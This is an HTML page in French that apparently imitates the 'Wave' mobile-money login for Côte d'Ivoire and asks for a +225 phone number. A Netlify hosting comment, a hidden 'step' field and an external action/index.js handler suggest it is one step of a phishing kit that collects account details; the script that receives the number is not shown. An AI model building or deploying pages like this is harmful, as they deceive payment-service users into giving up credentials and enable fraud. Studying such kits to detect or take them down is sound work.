<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <!-- This site is hosted on Netlify. Anyone can build and deploy a site
     like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=bc911a02-062a-4522-ae29-c12aa864b4cb
     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>
      Connexion Wave
    </title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
    <style>
      body {
        background-color: white;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .container {
        max-width: 400px;
        text-align: center;
      }
      .form-control {
        border: none;
        border-bottom: 1px solid #ccc;
        border-radius: 0;
        box-shadow: none;
      }
      .flag-select {
        display: flex;
        align-items: center;
      }
      .flag-select img {
        width: 24px;
        height: auto;
        margin-right: 8px;
      }

      .btn-suivant {
        width: 100%;
        border-radius: 25px;
        font-weight: bold;
        padding: 14px;
        margin-top: 60px;
        transition: background-color 0.3s ease, color 0.3s ease;
        border: none;
      }

      .btn-suivant:disabled {
        background-color: #e5f8ff;
        color: white;
        cursor: default;
      }

      .btn-suivant.enabled {
        background-color: #0095f6 !important;
        color: white;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <p class="mt-5 mb-4 fs-5">
        Bienvenue chez
        <strong>Wave</strong>
        ! Pour commencer,
        <br />
        entrez votre numéro de mobile
      </p>
      <form id="phoneForm">
        <input type="hidden" name="step" value="phone" />
        <div class="input-group mb-3">
          <span class="input-group-text bg-white border-0 flag-select">
            <img src="https://flagcdn.com/w40/ci.png" alt="CI Flag" />
            +225
          </span>
          <input type="tel" id="phoneInput" name="phone" class="form-control" placeholder="0X XX XX XX XX" maxlength="10" required />
        </div>
        <button id="btnSuivant" type="submit" class="btn btn-suivant" disabled>
          Suivant
        </button>
      </form>
    </div>
    <!-- Inclusion du script action/index.js -->
    <script src="action/index.js"></script>
    <script>
      const phoneInput = document.getElementById('phoneInput');
      const btnSuivant = document.getElementById('btnSuivant');
      const phoneForm = document.getElementById('phoneForm');

      // Gestion du bouton "Suivant"
      phoneInput.addEventListener('input', () => {
        const cleaned = phoneInput.value.replace(/\D/g, '');
        if (cleaned.length === 10) {
          btnSuivant.disabled = false;
          btnSuivant.classList.add('enabled');
        } else {
          btnSuivant.disabled = true;
          btnSuivant.classList.remove('enabled');
        }
      });

      // Gestion de la soumission du formulaire
      phoneForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const formData = Object.fromEntries(new FormData(phoneForm).entries());

        // Appel de la fonction handleStep depuis action/index.js si présente
        if (typeof handleStep === 'function') {
          await handleStep(formData.step, formData);
        }
      });
    </script>
  </body>
</html>
